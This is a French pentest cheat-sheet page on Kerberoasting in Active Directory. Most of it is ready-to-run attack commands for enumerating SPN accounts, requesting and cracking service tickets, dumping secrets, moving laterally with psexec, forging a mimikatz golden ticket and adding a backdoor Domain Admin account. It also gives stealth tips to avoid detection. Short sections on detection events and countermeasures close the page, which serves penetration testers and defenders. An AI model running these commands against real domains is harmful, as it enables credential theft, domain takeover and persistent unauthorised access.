#  Kerberoasting 

Le Kerberoasting est une attaque ciblant le protocole Kerberos dans les environnements Active Directory. Elle consiste à demander des tickets de service (TGS) pour des comptes ayant un SPN (Service Principal Name) enregistré, puis à cracker ces tickets hors ligne pour récupérer le mot de passe en clair du compte de service.


##  Objectifs

- Identifier les comptes avec un SPN enregistré
- Demander des tickets TGS pour ces comptes
- Cracker les tickets hors ligne
- Récupérer les credentials des comptes de service
- Utiliser ces credentials pour l'escalade de privilèges



##  Prérequis

| Élément            | Détail                                          |
|--------------------|-------------------------------------------------|
| Accès requis       | N'importe quel compte utilisateur du domaine    |
| Credentials        | Username + Password ou Hash NTLM                |
| Position réseau    | Accès au contrôleur de domaine (port 88)        |
| Outils nécessaires | Impacket / NetExec / Rubeus / Hashcat / John    |



##  Quick Attack
::: code-group
```bash [Impacket]
# Via Impacket
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC> -request
```
```bash [NetExec]
# Via NetExec
nxc ldap <DC> -u user -p password --kerberoasting output.txt
```
```bash [Rubeus]
# Via Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt
```
:::


##  Workflow 
```
1. Obtenir un compte utilisateur du domaine
2. Enumérer les comptes avec SPN (cibles kerberoastables)
3. Demander les tickets TGS pour ces comptes
4. Extraire les hashes des tickets
5. Cracker les hashes hors ligne (Hashcat / John)
6. Utiliser les credentials récupérés
```



##  Théorie

### Mécanisme

Kerberos utilise des tickets pour authentifier les utilisateurs aux services. Lorsqu'un utilisateur demande un ticket TGS (Ticket Granting Service) pour accéder à un service, le KDC chiffre ce ticket avec le hash NTLM du compte de service associé au SPN. N'importe quel utilisateur authentifié peut demander ce ticket et il peut ensuite être cracké hors ligne sans déclencher d'alerte.

### Conditions d'exploitation

- Posséder un compte utilisateur valide dans le domaine
- Des comptes de service avec SPN enregistré doivent exister
- Les comptes de service ont idéalement des mots de passe faibles ou anciens
- Accès réseau au contrôleur de domaine sur le port 88 (Kerberos)

### Protocoles impliqués

| Protocole | Rôle dans l'attaque                         |
|-----------|---------------------------------------------|
| Kerberos  | Demande et émission des tickets TGS         |
| LDAP      | Enumération des SPNs dans l'annuaire        |
| SMB       | Mouvement latéral post-exploitation         |



##  Enumeration / Reconnaissance

### Identifier les comptes kerberoastables via Impacket
```bash
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC>
```

### Identifier via NetExec
```bash
nxc ldap <DC> -u user -p password --kerberoasting output.txt
```

### Identifier via LDAP
```bash
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

### Identifier via BloodHound
```bash
# Lancer l'ingestor
bloodhound-python -u user -p password -d domain.com -dc <DC> -c all
```
```
# Requête Cypher BloodHound
MATCH (u:User {hasspn:true}) RETURN u
```

### Identifier via PowerView (Windows)
```powershell
Get-DomainUser -SPN
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName
```



##  Exploitation

###   Impacket GetUserSPNs
```bash
# Lister les SPNs
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC>

# Demander les tickets et sauvegarder
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC> -request -outputfile hashes.txt

# Avec hash NTLM
impacket-GetUserSPNs domain.com/user -hashes :NTLMhash -dc-ip <DC> -request
```

###   NetExec
```bash
nxc ldap <DC> -u user -p password --kerberoasting hashes.txt
```

###   Rubeus (Windows)
```bash
# Kerberoast tous les comptes
Rubeus.exe kerberoast /outfile:hashes.txt

# Cibler un compte spécifique
Rubeus.exe kerberoast /user:svcaccount /outfile:hash.txt

# Format Hashcat
Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
```

###   Invoke-Kerberoast (PowerShell)
```powershell
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.txt
```

###   Metasploit
```bash
use auxiliary/gather/get_user_spns
set RHOSTS <DC>
set SMBUser user
set SMBPass password
set DOMAIN domain.com
run
```



##  Crack des Hashes

### Identifier le format
```
$krb5tgs$23$*user*$domain$SPN*$hash...  → RC4  (13100)
$krb5tgs$17$*user*$domain$SPN*$hash...  → AES128 (19600)
$krb5tgs$18$*user*$domain$SPN*$hash...  → AES256 (19700)
```

### Hashcat  RC4 (mode 13100)
```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Hashcat  AES128 (mode 19600)
```bash
hashcat -m 19600 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Hashcat  AES256 (mode 19700)
```bash
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Hashcat avec règles
```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### John the Ripper
```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hashes.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
```



##  Post-Exploitation

### Utiliser les credentials récupérés
```bash
# Vérifier les accès
nxc smb <target> -u svcaccount -p CrackedPassword

# Mouvement latéral PSExec
impacket-psexec domain.com/svcaccount:CrackedPassword@<target>

# Dump secrets
impacket-secretsdump domain.com/svcaccount:CrackedPassword@<target>
```

### Escalade de privilèges
```bash
# Vérifier les droits du compte
net user svcaccount /domain
whoami /all

# Vérifier si membre d'un groupe privilégié
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```

### Persistance
```bash
# Golden Ticket si DA compromis
mimikatz # kerberos::golden /user:Administrator /domain:domain.com \
  /sid:<SID> /krbtgt:<hash> /ptt

# Ajout compte admin
net user hacker Password123! /add /domain
net group "Domain Admins" hacker /add /domain
```



##  Détection & IOC

### Logs Windows à surveiller

| Event ID | Description                              |
|----------|------------------------------------------|
| 4769     | TGS Kerberos demandé (RC4 = suspect)     |
| 4770     | TGS Kerberos renouvelé                   |
| 4768     | TGT demandé                              |

### Indicateurs de compromission

- Nombreuses requêtes TGS (Event 4769) depuis une même IP
- Demandes de tickets avec chiffrement RC4 (`0x17`) pour des comptes de service
- Compte utilisateur demandant des TGS pour de nombreux SPNs différents
- Activité inhabituelle sur les comptes de service après les demandes



##  Contre-mesures

- Utiliser des mots de passe longs et complexes (25+ caractères) pour les comptes de service
- Implémenter des **Managed Service Accounts (MSA)** ou **Group Managed Service Accounts (gMSA)**
- Auditer régulièrement les comptes avec SPN (`Get-DomainUser -SPN`)
- Activer **AES256** et désactiver **RC4** pour Kerberos
- Monitorer l'Event ID 4769 avec chiffrement RC4
- Appliquer le principe du moindre privilège sur les comptes de service
- Implémenter **Kerberos Armoring (FAST)**



##  Points d'attaque

- Comptes de service avec mots de passe faibles ou anciens
- Chiffrement RC4 encore autorisé (facilite le crack)
- Comptes de service avec privilèges excessifs
- Absence d'audit sur les demandes TGS massives
- gMSA non implémentés
- SPNs enregistrés sur des comptes utilisateurs standards



::: tip

- Prioriser les comptes de service membres de groupes privilégiés (DA, EA)
- Les tickets RC4 (`0x17`) sont beaucoup plus rapides à cracker que AES256
- Utiliser BloodHound pour identifier les comptes kerberoastables à fort impact
- Cibler un seul compte à la fois pour rester discret (éviter les demandes massives)
- Corréler avec AS-REP Roasting pour maximiser la collecte de hashes
- Un compte gMSA n'est pas kerberoastable (mot de passe de 120 caractères aléatoires)

:::

::: details  Checklist

- Compte utilisateur du domaine obtenu
- Comptes avec SPN énumérés
- Comptes privilégiés kerberoastables identifiés
- Tickets TGS demandés et exportés
- Format des hashes identifié (RC4 / AES)
- Crack Hashcat lancé
- Credentials récupérés
- Accès validé avec les nouveaux credentials
- Mouvement latéral effectué
- Escalade de privilèges réalisée
- Persistance établie
- IOC documentés

:::


##  Tools

- [Impacket GetUserSPNs](https://github.com/SecureAuthCorp/impacket)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Hashcat](https://hashcat.net/hashcat/)
- [John the Ripper](https://github.com/openwall/john)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit)



## 📚 Ressources

- [HackTricks Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [The Hacker Recipes Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)
- [PayloadsAllTheThings Kerberoast](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting)
- [Impacket GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)



## 🧾 Notes
```
# Notes terrain
```







<div class="page-footer">

<span>📅 ![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![✏️ Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/ad/kerberoasting.md)</span>

</div>